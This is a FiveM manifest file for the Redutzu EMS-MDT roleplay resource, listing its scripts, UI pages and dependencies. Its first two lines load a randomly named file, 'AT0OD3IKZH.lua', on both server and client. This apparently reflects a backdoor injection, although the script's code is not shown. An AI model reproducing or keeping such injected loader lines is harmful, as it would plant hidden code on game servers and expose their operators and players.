server_script "AT0OD3IKZH.lua"
client_script "AT0OD3IKZH.lua"
fx_version 'cerulean'
game 'gta5'

author 'Redutzu'
version '2.1.4'
description 'Take roleplay to another level with the most advanced EMS-MDT on FiveM'
github 'https://github.com/redutzu'

lua54 'yes'

ui_page 'nui/dist/index.html'

shared_scripts {
    '@ox_lib/init.lua', -- uncomment this if you use QBox
    'config/config.lua',
    'shared/init.lua',
    'shared/utils.lua',
    'shared/locales.lua'
}

client_scripts {
    '@qbx_core/modules/playerdata.lua', -- uncomment this if you use QBox
    'client/custom/**',
    'client/utils/**',
    'client/modules/**',
    'client/*'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua', -- '@mysql-async/lib/MySQL.lua',
    'config/upload.lua',
    'server/cache.lua',
    'server/custom/**',
    'server/modules/**',
    'server/*'
}

escrow_ignore {
    'shared/locales.lua',
    'server/custom/**',
    'client/custom/**',
    'config/*'
}

files {
    'nui/dist/**',
    'config/permissions.json'
}

dependencies {
    '/assetpacks',
    'redutzu-ems-prop',
    'screenshot-basic',
    'oxmysql' -- or 'mysql-async'
}

dependency '/assetpacks'